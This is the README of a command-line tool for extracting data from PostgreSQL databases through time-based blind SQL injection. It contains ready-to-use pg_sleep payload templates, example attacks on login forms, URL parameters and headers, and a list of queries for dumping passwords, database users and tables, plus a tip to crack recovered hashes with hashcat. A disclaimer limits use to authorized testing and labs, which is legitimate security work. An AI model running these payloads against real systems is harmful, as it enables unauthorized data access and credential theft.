# pg-time-blind

A small, dependency-light **PostgreSQL time-based blind SQL injection** data extractor.

When a target only leaks data through *how long it takes to respond* (a `pg_sleep`
oracle), this tool pulls a value out automatically — one command, no sqlmap. It binary-searches
the ASCII value of each character (~7 requests/char instead of brute-forcing all 95 printable
characters), so extraction is fast and predictable.

It is deliberately **generic**: the injection point, HTTP method, parameter name, and payload
shape are all configurable, so it works against any PostgreSQL target with a time-based
injection — not just one specific app.

---

## ⚠️ Legal / ethical use

This tool is for **authorized security testing and education only** — your own systems,
lab machines (e.g. OffSec Proving Grounds, HackTheBox), or targets you have **explicit written
permission** to test. Unauthorized access to computer systems is illegal in most jurisdictions.
You are solely responsible for how you use it. The author accepts no liability for misuse.

---

## Features

- PostgreSQL `pg_sleep()` time-based oracle
- Binary search per character (~7 requests/char)
- Inject into **URL**, **body**, or a **header** via a placeholder marker
- Works with `GET`, `POST`, or any method
- Five built-in payload presets (`stacked`, `and`, `or`, `and-num`, `or-num`) + custom `--template`
- Load a raw Burp/ZAP request file with `--request`
- Baseline self-check (`1=1`) before extracting, so a wrong context fails loudly
- Jitter-resistant: re-confirms every positive (`--retries`)
- No heavy dependencies — just `requests`

---

## Requirements

- Python 3.7+
- [`requests`](https://pypi.org/project/requests/)

```bash
pip install -r requirements.txt
```

---

## Quick start

```bash
git clone https://github.com/<your-username>/pg-time-blind.git
cd pg-time-blind
pip install -r requirements.txt
python3 pg_time_blind.py --help
```

---

## How it works

1. You mark the injection point in the request with a placeholder (default: `INJECT`).
2. The tool replaces that marker with a payload built from a **template** that contains two
   placeholders: `{cond}` (a true/false SQL condition) and `{sleep}` (seconds to sleep).
3. If the response comes back slow, the condition was **TRUE**. If it's fast, **FALSE**.
4. Using that true/false oracle it first finds the value's length, then binary-searches each
   character by its ASCII code.

Example of a generated payload (`stacked` preset):

```sql
';SELECT pg_sleep(3) WHERE ascii(substr((SELECT password FROM users WHERE username='bob'),1,1))>77--
```

---

## Usage

```
python3 pg_time_blind.py --query "<SQL scalar>" [target] [injection opts] [tuning]
```

### Target (choose one style)

| Flag | Meaning |
|------|---------|
| `-u, --url`      | Target URL (may contain the marker for GET injection) |
| `-d, --data`     | Request body (may contain the marker) |
| `-H, --header`   | Extra header `'Name: value'`, repeatable (may contain the marker) |
| `-X, --method`   | HTTP method (default: `POST` if `-d` given, else `GET`) |
| `--request`      | Raw HTTP request file containing the marker |
| `--proto`        | Scheme for `--request` files (default `http`) |

### Injection

| Flag | Meaning |
|------|---------|
| `--query`     | **(required)** SQL scalar to extract, e.g. `"SELECT password FROM users WHERE username='bob'"` |
| `--preset`    | Payload shape: `stacked` (default), `and`, `or`, `and-num`, `or-num` |
| `--template`  | Custom payload template using `{cond}` and `{sleep}` (overrides `--preset`) |
| `--marker`    | Placeholder string for the injection point (default `INJECT`) |
| `--no-encode` | Do **not** URL-encode the payload |

### Tuning

| Flag | Default | Meaning |
|------|---------|---------|
| `--sleep`     | `3.0` | Seconds for `pg_sleep` |
| `--threshold` | `sleep*0.6` | Response time counted as "slept" |
| `--retries`   | `1` | Re-confirm each positive N times (beats network jitter) |
| `--maxlen`    | `64` | Max value length to probe |
| `--cmin/--cmax` | `32/126` | ASCII bounds for the binary search |
| `--proxy`     | – | e.g. `http://127.0.0.1:8080` to view in Burp |

---

## Payload presets

Pick the one that matches the injection context (`foo` = the original value):

| Preset    | Context | Looks like |
|-----------|---------|------------|
| `stacked` | string, stacked query | `foo';SELECT pg_sleep(s) WHERE {cond}--` |
| `and`     | string, boolean AND   | `foo' AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep(s)) ELSE 1 END)=1--` |
| `or`      | string, boolean OR    | `foo' OR  (...) --` |
| `and-num` | numeric, AND          | `1 AND (CASE WHEN ({cond}) THEN ...)=1--` |
| `or-num`  | numeric, OR           | `1 OR  (...) --` |

Need something unusual (extra parentheses, different comment, no closing quote)? Use
`--template` with your own string containing `{cond}` and `{sleep}`.

---

## Examples

**1. Login form, POST body, stacked query**

```bash
python3 pg_time_blind.py \
  -u http://10.10.10.10:3000/login \
  -d "username=INJECT&password=test" \
  --query "SELECT password FROM users WHERE username='admin'"
```

**2. Reuse a saved Burp request** (put `INJECT` where the payload goes)

```bash
python3 pg_time_blind.py --request req.txt \
  --query "SELECT current_user"
```

**3. Numeric GET parameter, AND context**

```bash
python3 pg_time_blind.py \
  -u "http://target/item?id=INJECT" --preset and-num \
  --query "SELECT version()"
```

**4. Header injection**

```bash
python3 pg_time_blind.py -u http://target/ \
  -H "X-Forwarded-For: INJECT" --preset and \
  --query "SELECT usename FROM pg_user LIMIT 1"
```

**5. Custom template (full control)**

```bash
python3 pg_time_blind.py -u http://t/x -d "q=INJECT" \
  --template "1)) AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1-- -" \
  --query "SELECT string_agg(usename,',') FROM pg_user"
```

---

## Sample output

```
[*] target  : POST http://10.10.10.10:3000/login
[*] preset  : stacked
[*] query   : SELECT password FROM users WHERE username='admin'
[*] sleep=3.0s threshold=1.80s

[+] injection confirmed (TRUE condition delayed the response)

[+] length = 11
[*] extracting: s3cr3tP@ss

[+] RESULT: s3cr3tP@ss!
[*] total requests: 96
```

---

## Useful queries to feed `--query`

| Goal | `--query` value |
|------|-----------------|
| Current DB user | `SELECT current_user` |
| Version | `SELECT version()` |
| Current database | `SELECT current_database()` |
| Is superuser | `SELECT current_setting('is_superuser')` |
| List users | `SELECT string_agg(usename,',') FROM pg_user` |
| List tables | `SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'` |
| Dump a password | `SELECT password FROM users WHERE username='admin'` |

---

## Tips

- If the result is a **hash**, extract it here, then crack it offline (e.g.
  `hashcat -m <mode> hash.txt rockyou.txt`) — far faster than guessing through the oracle.
- Raise `--sleep` (e.g. `5`) on slow/jittery networks; lower it (e.g. `2`) on fast local labs to speed up.
- If the baseline check fails, your `--preset`/context or marker placement is wrong — not necessarily that the target is safe.
- Keep concurrency low; time-based oracles are sensitive to load. (This tool is single-threaded by design for clean timing.)

---

## Contributing

Issues and PRs welcome — especially additional presets and other-DBMS support
(MySQL `SLEEP()`, MSSQL `WAITFOR DELAY`, Oracle `dbms_pipe.receive_message`).

## License

[MIT](LICENSE)
